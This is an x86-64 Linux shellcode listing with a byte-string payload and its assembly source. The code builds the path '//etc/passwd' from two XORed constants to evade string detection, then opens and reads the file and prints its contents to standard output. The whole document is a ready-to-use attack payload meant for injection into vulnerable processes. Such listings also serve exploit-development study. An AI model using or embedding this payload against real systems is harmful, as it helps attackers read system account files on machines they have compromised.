; Author: Robert Catalin Raducioiu
; Shellcode length: 76 bytes
; Shellcode: "\x31\xc0\x50\x68\x73\x73\x77\x64\x48\xbb\xcb\x17\x0e\x35\x52\xc1\xbd\xcd\x48\xb9\xe4\x38\x6b\x41\x31\xee\xcd\xac\x48\x31\xcb\x53\x48\x89\xe7\x04\x02\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x89\xe6\x48\x89\xc7\x99\x66\xba\xff\x0f\x31\xc0\x0f\x05\x31\xff\xff\xc7\x48\x89\xf8\x0f\x05\x57\x58\x04\x3b\x0f\x05"

global _start

section .text

_start:

OpenFile:

	xor eax, eax
	push rax

	push 0x64777373

	mov rbx, 0xcdbdc152350e17cb
	mov rcx, 0xaccdee31416b38e4
	xor rbx, rcx

	push rbx

	mov rdi, rsp
  
	add al, 2

	xor esi, esi
	syscall

ReadFile:

	sub sp, 0xfff
	mov rsi, rsp

	mov rdi, rax

	cdq
	mov dx, 0xfff

	xor eax, eax
	syscall

WriteOutput:
  
	xor edi, edi
	inc edi
	mov rax, rdi

	syscall

Exit:
	  
	push rdi
	pop rax
	add al, 59
	syscall
